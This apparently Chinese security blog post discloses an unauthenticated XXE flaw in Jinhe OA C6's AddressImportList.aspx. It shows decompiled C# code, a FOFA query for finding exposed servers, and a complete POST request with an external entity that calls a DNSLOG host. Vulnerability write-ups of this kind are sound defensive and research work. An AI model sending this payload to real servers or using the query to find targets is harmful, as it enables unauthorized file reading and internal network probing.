---
title: "金和OA AddressImportList.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-AddressImportList-xxe.html
asset_dir: assets/金和oa-addressimportlist.aspx-xxe漏洞
---

# 金和OA AddressImportList.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/19 13:09
- 552浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

网络安全会议

漏洞修复方案

VPN服务

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AddressImportList.aspx` 接口处存在[XXE漏洞](https://mrxn.net/tag/XXE)，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

Web安全课程

SQL注入检测工具

Docker加速服务

直接根据 `AddressImportList.aspx` 在 `bin` 目录下查找 `JHSoft.Web.AddressBook.dll` 将其进行反编译后找到 **AddressImportList** 的处理逻辑

```
public class AddressImportList : PageBase
{
  protected void Page_Load(object sender, EventArgs e)
  {
    if (((Control) this).Page.IsPostBack)
      return;
    ((Control) this).Context.Response.Write(this.GetXmlInfoAndSave());
  }
```

跟进 `GetXmlInfoAndSave` 方法

```
private string GetXmlInfoAndSave()
{
  string str1 = string.Empty;
  string str2 = string.Empty;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.addressbook/AddressImportList.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA AddressImportList.aspx XXE漏洞](images/img-001-d8ab722b3fc5.webp)](https://image.mrxn.net/a41ccba0c8f64f15b64d48d319931362.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
